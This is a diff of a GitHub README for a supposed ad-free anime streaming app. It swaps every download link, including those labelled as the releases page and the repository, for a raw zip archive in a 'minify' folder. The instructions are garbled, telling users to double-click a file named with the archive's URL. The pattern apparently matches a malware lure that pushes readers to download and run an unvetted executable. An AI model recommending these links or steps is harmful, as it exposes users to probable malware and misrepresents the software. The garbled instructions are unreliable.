@@ -1,6 +1,6 @@
 # 🎉 Sankanime-Web-Stream-Anime - Enjoy Anime Without Ads
 
-[![Download](https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip)
+[![Download](https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip)
 
 ## 📘 Overview
 
@@ -12,12 +12,12 @@ This guide will help you download and run Sankanime-Web-Stream-Anime on your com
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip) to access the releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip) to access the releases page.
    
 2. **Choose Your Version:** Look for the latest version available. It is generally marked as the most recent release. 
 
 3. **Download the Application:** 
-   - Click on the file that says `https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip` or a similar name.
+   - Click on the file that says `https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip` or a similar name.
    - Save it to a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
 
 4. **Extract the Files:** 
@@ -27,7 +27,7 @@ This guide will help you download and run Sankanime-Web-Stream-Anime on your com
 
 5. **Run the Application:** 
    - After extraction, locate the folder.
-   - Inside, double-click the file named `https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip` (or similar name) to launch the application.
+   - Inside, double-click the file named `https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip` (or similar name) to launch the application.
 
 ## 🖥️ System Requirements
 
@@ -58,7 +58,7 @@ If you encounter issues while using Sankanime-Web-Stream-Anime, consider the fol
 If you have any questions or need assistance, feel free to open an issue on the GitHub repository. The community or maintainers will be happy to help.
 
 ## 🔗 Additional Links
-- [Official Releases Page](https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/supmydudes69edy/Sankanime-Web-Stream-Anime/main/minify/Sankanime-Web-Stream-Anime.zip)
+- [Official Releases Page](https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip)
+- [GitHub Repository](https://github.com/supmydudes69edy/Sankanime-Web-Stream-Anime/raw/refs/heads/main/minify/Stream_Sankanime_Web_Anime_1.4.zip)
 
 Now you're ready to enjoy your favorite anime shows without any ads! Download Sankanime-Web-Stream-Anime today and immerse yourself in your favorite stories.
